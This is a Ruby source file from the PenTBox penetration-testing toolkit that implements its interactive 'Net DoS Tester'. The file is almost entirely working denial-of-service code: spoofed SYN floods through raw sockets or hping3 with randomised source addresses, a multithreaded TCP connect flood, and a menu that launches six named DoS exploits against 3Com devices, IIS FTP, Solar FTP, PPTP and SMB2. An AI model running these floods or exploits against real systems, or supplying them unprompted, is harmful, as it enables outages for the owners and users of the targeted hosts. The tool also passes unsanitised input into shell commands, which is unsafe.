=begin

    Copyright (C) 2009, 2010, 2011

    Alberto Ortega Llamas
    alberto.kun666[at]gmail[dot]com

    PenTBox (Penetration Testing Box)

    This file is part of PenTBox.

    PenTBox is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    PenTBox is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with PenTBox.  If not, see <http://www.gnu.org/licenses/>.

=end

module Network_pb
class Net_dos_pb
def initialize()

require "socket"
require "timeout"
Dir.glob(File.join(File.dirname(__FILE__), '/dos_exploits/*.rb')).each { |e| require e } # DoS Exploits
require File.dirname(__FILE__) + "/../../lib/racket/racket.rb"

exploit_options = { "host" => false, "port" => false, "defport" => false, "user" => false, "pass" => false }

puts ""
title "// Net DoS Tester //"
puts ""
puts " | Attacks |"
puts ""
puts "1- Spoofed SYN Flood Native (Raw Sockets, better, faster)"
puts "2- Spoofed SYN Flood hping3 (Must have installed hping3)"
puts "3- TCP Flood"
puts ""
puts " | Exploits |"
puts ""
puts "4- [other/http] 3Com SuperStack Switch DoS"
puts "5- [other/http] 3Com OfficeConnect Routers DoS (Content-Type)"
puts "6- [windows/ftp] Windows 7 IIS7.5 FTPSVC UNAUTH'D DoS"
puts "7- [windows/ftp] Solar FTP Server 2.1 DoS"
puts "8- [windows/pptp] MS02-063 PPTP Malformed Control Data Kernel DoS"
puts "9- [windows/smb] Windows Vista/7 SMB2.0 Negotiate Protocol Request DoS BSOD"
puts ""
print "   -> "
mode = gets_pb.chomp

if mode.to_i > 3

	modeint = mode.to_i
	if modeint == 4
		exploit_options = tcom_ssswitch_dos_load(exploit_options)
	elsif modeint == 5
		exploit_options = tcom_oconn_dos_load(exploit_options)
	elsif modeint == 6
		exploit_options = iis7ftp_dos_load(exploit_options)
	elsif modeint == 7
		exploit_options = solarftp_dos_load(exploit_options)
	elsif modeint == 8
		exploit_options = mspptp_dos_load(exploit_options)
	elsif modeint == 9
		exploit_options = smb_dos_load(exploit_options)
	else
		puts ""
		puts "Invalid option."
		puts ""
	end

	if exploit_options["host"] != false
		puts ""
		puts " Insert host to DoS."
		puts ""
		print "   -> "
		exploit_options["host"] = gets_pb.chomp
	end
	if exploit_options["defport"] != false
		puts ""
		puts " Insert port (Default #{exploit_options['defport']})."
		puts ""
		print "   -> "
		e_port = gets_pb.chomp
		if e_port != ""
			exploit_options["defport"] = e_port.to_i
		end
	end
	if exploit_options["port"] != false
		puts ""
		puts " Insert port."
		puts ""
		print "   -> "
		exploit_options["port"] = gets_pb.chomp.to_i
	end
	if exploit_options["user"] != false
		puts ""
		puts " Insert username for connection."
		puts ""
		print "   -> "
		exploit_options["user"] = gets_pb.chomp
	end
	if exploit_options["pass"] != false
		puts ""
		puts " Insert password for connection."
		puts ""
		print "   -> "
		exploit_options["pass"] = gets_pb.chomp
	end

	puts ""

	if modeint == 4
		tcom_ssswitch_dos(exploit_options)
	elsif modeint == 5
		tcom_oconn_dos(exploit_options)
	elsif modeint == 6
		iis7ftp_dos(exploit_options)
	elsif modeint == 7
		solarftp_dos(exploit_options)
	elsif modeint == 8
		mspptp_dos(exploit_options)
	elsif modeint == 9
		smb_dos(exploit_options)
	end
else

	puts ""
	puts " Insert host to DoS."
	puts ""
	print "   -> "
	ip = gets_pb.chomp
	puts ""
	puts " Insert port to DoS."
	puts ""
	print "   -> "
	port = gets_pb.chomp

	if mode == "1" || mode == "2"
		puts ""
		puts "Insert source address of the packets"
		puts "(press enter for random sources)."
		puts ""
		print "   -> "
		source = gets_pb.chomp
		if source == ""
			randpackets = true
		else
			randpackets = false
		end
	end

	puts ""
	spoofedsyn = 0
	if mode == "1"
		begin
			pack = Racket::Racket.new
			pack.l3 = Racket::L3::IPv4.new
			pack.l3.dst_ip = ip
			pack.l3.protocol = 6
			pack.l4 = Racket::L4::TCP.new
			pack.l4.src_port = rand(65535) + 1
			pack.l4.dst_port = port.to_i
			pack.l4.flag_syn = 1
			pack.l4.ack = 0
		rescue
			puts " Error building packet."
			puts ""
			exit
		end
		if randpackets == true
			Thread.new do
				puts "[*] DoSing #{ip} on port #{port}"
				loop do
					sleep(1)
					STDOUT.flush
					print "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (rand src) "
				end
			end
			begin
				loop do
					pack.l3.src_ip = "#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}"
					pack.l3.ttl = 128
					pack.l4.window = rand(4096) + 1
					pack.l4.src_port = rand(65535) + 1
					pack.l4.seq = 0
					pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
					pack.sendpacket
					spoofedsyn += 1
				end
			rescue
				puts ""
				puts " Error sending packets. Root?"
				puts ""
				exit
			end
		else
			Thread.new do
				puts "[*] DoSing #{ip} on port #{port}"
				loop do
					sleep(1)
					STDOUT.flush
					print "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (#{source}) "
				end
			end
			begin
				loop do
					pack.l3.src_ip = source
					pack.l3.ttl = 128
					pack.l4.window = rand(4096) + 1
					pack.l4.src_port = rand(65535) + 1
					pack.l4.seq = 0
					pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
					pack.sendpacket
					spoofedsyn += 1
				end
			rescue
				puts ""
				puts " Error sending packets. Root?"
				puts ""
				exit
			end
		end
	elsif mode == "2"
		if randpackets == true
			loop do
				source = "#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}"
				spoofedsyn += 100
				system("clear")
				puts ""
				puts "DoSing #{ip} on port #{port}"
				puts "Number of Spoofed SYN sent -> #{spoofedsyn.to_s}"
				puts "----------------- Source (#{source})"
				system("hping3 -q -c 100 -i u1000 -S -a #{source} -p #{port} #{ip}")
			end
		else
			loop do
				spoofedsyn += 500
				system("clear")
				puts ""
				puts "DoSing #{ip} on port #{port}"
				puts "Number of Spoofed SYN sent -> #{spoofedsyn.to_s}"
				puts "----------------- Source (#{source})"
				system("hping3 -q -c 500 -i u1000 -S -a #{source} -p #{port} #{ip}")
			end
		end
	elsif mode == "3"
		$number = 0
		$bytes = 0
		$kbytes = 0

		def tcp_attack(ip, port)
			Thread.new do
				loop do
					begin
						# This number changes dramatically the power of the attack.
						Timeout::timeout(0.00001) do
							# Increases 2 because this code sends a SYN and then a RST (reset connection) packet,
							# this is caused by the Timeout.
							$number += 2
							# KBytes per second.
							# 74 bytes from the SYN and 54 from the RST.
							$bytes += 74 + 54
							$kbytes = $bytes/1024
							socket = TCPSocket.new(ip, port)
						end
					rescue Timeout::Error
					end
				end
			end
		end

		begin
			socket = TCPSocket.new(ip, port)
		rescue
		end

		if !socket
			puts "Closed/filtered port, or connection problem."
			puts ""
		else
			socket.close
			20.times do
				tcp_attack(ip, port)
			end
			puts "[*] DoSing #{ip} on port #{port}"
			loop do
				STDOUT.flush
				print "\r    Sent -> #{$number.to_s} - #{$kbytes.to_s} kB/s "
				$bytes = 0
				$kbytes = 0
				sleep(1)
			end
		end
	else
		puts "Invalid option."
		puts ""
	end
end

end
end
end
